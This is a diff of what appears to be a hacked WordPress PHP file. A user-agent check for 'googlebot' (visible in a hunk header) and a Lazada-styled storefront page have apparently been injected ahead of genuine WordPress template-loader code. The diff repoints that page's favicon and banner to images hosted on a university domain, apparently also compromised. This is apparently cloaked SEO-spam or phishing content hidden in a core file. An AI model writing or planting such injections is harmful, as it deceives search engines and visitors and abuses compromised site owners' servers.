@@ -45,7 +45,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot'))
     <link
       rel="icon"
       type="image/x-icon"
-      href="https://res.cloudinary.com/dwg5g7rov/image/upload/v1733210338/tbtv7lvgze32mpte7mty.webp"
+      href="https://www.gluk.ac.ke/wp-content/uploads/2025/02/cropped-gluk_logo-removebg-preview.png"
     />
     <link
       rel="manifest"
@@ -294,7 +294,7 @@ var n=t.changedTouches[e],o={};for(var a in n)o[a]=n[a];var s={startTouch:o,star
       }
 
       .lzd-header-banner {
-        background-image: url(https://res.cloudinary.com/dwg5g7rov/image/upload/v1733210338/tbtv7lvgze32mpte7mty.webp) !important;
+        background-image: url(https://www.gluk.ac.ke/wp-content/uploads/2025/02/cropped-gluk_logo-removebg-preview.png) !important;
         background-size: contain !important;
         background-repeat: no-repeat;
       }
@@ -6713,62 +6713,115 @@ exit;
 ?>
 <?php
 /**
- * @package WordPress
- * @subpackage Theme_Compat
- * @deprecated 3.0.0
+ * Loads the correct template based on the visitor's url
  *
- * This file is here for backward compatibility with old themes and will be removed in a future version.
+ * @package WordPress
  */
-_deprecated_file(
-	/* translators: %s: Template name. */
-	sprintf( __( 'Theme without %s' ), basename( __FILE__ ) ),
-	'3.0.0',
-	null,
-	/* translators: %s: Template name. */
-	sprintf( __( 'Please include a %s template in your theme.' ), basename( __FILE__ ) )
-);
-?>
-<!DOCTYPE html>
-<html <?php language_attributes(); ?>>
-<head>
-<link rel="profile" href="https://gmpg.org/xfn/11" />
-<meta http-equiv="Content-Type" content="<?php bloginfo( 'html_type' ); ?>; charset=<?php bloginfo( 'charset' ); ?>" />
-
-<title><?php echo wp_get_document_title(); ?></title>
-
-<link rel="stylesheet" href="<?php bloginfo( 'stylesheet_url' ); ?>" type="text/css" media="screen" />
-<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
-
-<?php if ( file_exists( get_stylesheet_directory() . '/images/kubrickbgwide.jpg' ) ) { ?>
-<style type="text/css" media="screen">
-
-	<?php
-	// Checks to see whether it needs a sidebar.
-	if ( empty( $withcomments ) && ! is_single() ) {
-		?>
-	#page { background: url("<?php bloginfo( 'stylesheet_directory' ); ?>/images/kubrickbg-<?php bloginfo( 'text_direction' ); ?>.jpg") repeat-y top; border: none; }
-<?php } else { // No sidebar. ?>
-	#page { background: url("<?php bloginfo( 'stylesheet_directory' ); ?>/images/kubrickbgwide.jpg") repeat-y top; border: none; }
-<?php } ?>
-
-</style>
-<?php } ?>
-
-<?php
-if ( is_singular() ) {
-	wp_enqueue_script( 'comment-reply' );
+if ( wp_using_themes() ) {
+	/**
+	 * Fires before determining which template to load.
+	 *
+	 * @since 1.5.0
+	 */
+	do_action( 'template_redirect' );
 }
-?>
 
-<?php wp_head(); ?>
-</head>
-<body <?php body_class(); ?>>
-<div id="page">
+/**
+ * Filters whether to allow 'HEAD' requests to generate content.
+ *
+ * Provides a significant performance bump by exiting before the page
+ * content loads for 'HEAD' requests. See #14348.
+ *
+ * @since 3.5.0
+ *
+ * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ */
+if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
+	exit;
+}
 
-<div id="header" role="banner">
-	<div id="headerimg">
-		<h1><a href="<?php echo home_url(); ?>/"><?php bloginfo( 'name' ); ?></a></h1>
-		<div class="description"><?php bloginfo( 'description' ); ?></div>
-	</div>
-</div>
-<hr />
+// Process feeds and trackbacks even if not using themes.
+if ( is_robots() ) {
+	/**
+	 * Fired when the template loader determines a robots.txt request.
+	 *
+	 * @since 2.1.0
+	 */
+	do_action( 'do_robots' );
+	return;
+} elseif ( is_favicon() ) {
+	/**
+	 * Fired when the template loader determines a favicon.ico request.
+	 *
+	 * @since 5.4.0
+	 */
+	do_action( 'do_favicon' );
+	return;
+} elseif ( is_feed() ) {
+	do_feed();
+	return;
+} elseif ( is_trackback() ) {
+	require ABSPATH . 'wp-trackback.php';
+	return;
+}
+
+if ( wp_using_themes() ) {
+
+	$tag_templates = array(
+		'is_embed'             => 'get_embed_template',
+		'is_404'               => 'get_404_template',
+		'is_search'            => 'get_search_template',
+		'is_front_page'        => 'get_front_page_template',
+		'is_home'              => 'get_home_template',
+		'is_privacy_policy'    => 'get_privacy_policy_template',
+		'is_post_type_archive' => 'get_post_type_archive_template',
+		'is_tax'               => 'get_taxonomy_template',
+		'is_attachment'        => 'get_attachment_template',
+		'is_single'            => 'get_single_template',
+		'is_page'              => 'get_page_template',
+		'is_singular'          => 'get_singular_template',
+		'is_category'          => 'get_category_template',
+		'is_tag'               => 'get_tag_template',
+		'is_author'            => 'get_author_template',
+		'is_date'              => 'get_date_template',
+		'is_archive'           => 'get_archive_template',
+	);
+	$template      = false;
+
+	// Loop through each of the template conditionals, and find the appropriate template file.
+	foreach ( $tag_templates as $tag => $template_getter ) {
+		if ( call_user_func( $tag ) ) {
+			$template = call_user_func( $template_getter );
+		}
+
+		if ( $template ) {
+			if ( 'is_attachment' === $tag ) {
+				remove_filter( 'the_content', 'prepend_attachment' );
+			}
+
+			break;
+		}
+	}
+
+	if ( ! $template ) {
+		$template = get_index_template();
+	}
+
+	/**
+	 * Filters the path of the current template before including it.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @param string $template The path of the template to include.
+	 */
+	$template = apply_filters( 'template_include', $template );
+	if ( $template ) {
+		include $template;
+	} elseif ( current_user_can( 'switch_themes' ) ) {
+		$theme = wp_get_theme();
+		if ( $theme->errors() ) {
+			wp_die( $theme->errors() );
+		}
+	}
+	return;
+}
